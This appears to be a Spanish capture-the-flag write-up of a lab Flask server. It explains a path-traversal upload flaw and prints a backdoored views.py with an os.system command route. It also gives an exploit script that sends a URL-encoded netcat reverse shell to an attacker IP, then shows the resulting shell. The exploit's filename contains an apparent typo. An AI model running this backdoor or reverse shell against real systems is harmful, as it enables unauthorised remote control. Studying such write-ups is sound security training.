En la web hay una ruta para subir archivos "/upload" y otra para descargar el codigo fuente como zip.
En el codigo hay de todo, como una imagen docker para construir, pero los que nos interesa es un archivo llamado "views.py" dentro de la ruta
"./app/app", esto es el código fuente de la web, un código python de estilo api.

La ruta de /uploads es para subir un archivo, intente es clásico backdoor de php pero no funcionaba, asi que tras investigar, se da con que es un "LFI"
un poco extraño, consta de subir el archivo views.py en una ruta especial (especificada en filename) para que sobreescriba el views.py original y hacer la 
backdoor.
El root de la web o sea de donde parte es app/app porque es ahi donde esta el codigo fuente, pero nosotros tiramos del directorio uploads "/uploads" 
asi que hay que ir un paso atras. 
Hubo mucho problema para encontrar el lfi que funcionara, el primer intnto logico fue "../views.py"
al final funciono con "..//app/app/uploads" o sea "..//" + ruta absoluta. EN linus ../ es un directorio para atras, pero tambien se peude poner ..// y
no da error.

## Views.py

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file
from app import app

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))

@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
    
# Esta es la parte que añadimos nosotros ---------------------------------------->
@app.route('/exec')
def rce():
    return os.system(request.args.get('cmd'))
```


## Exploit 

```python
import requests
import re
atacker_ip = "10.10.16.100"
atacker_port = "443"

try:
        url = 'http://10.10.11.164/upcloud'
        python = open('views.py', 'rb')
        req = requests.post(url, data = {"filename":"..//app/app/views,py"}, files = {"file": python})
        url2 = "http://10.10.11.164"
        url2 += "/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20" 
        url2 += atacker_ip + "%20" + atacker_port + "%20%3E%2Ftmp%2Ff"
        req2 = requests.get(url2)
except:
    pass
```
Te pones en esuchca con el netcat por el puerto 443 y ejecutas el exploit.

```console
[cucuxii]~[opensource]:$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.16.100] from (UNKNOWN) [10.10.11.164] 45231
/bin/sh: can't access tty; job control turned off
/app # 
```




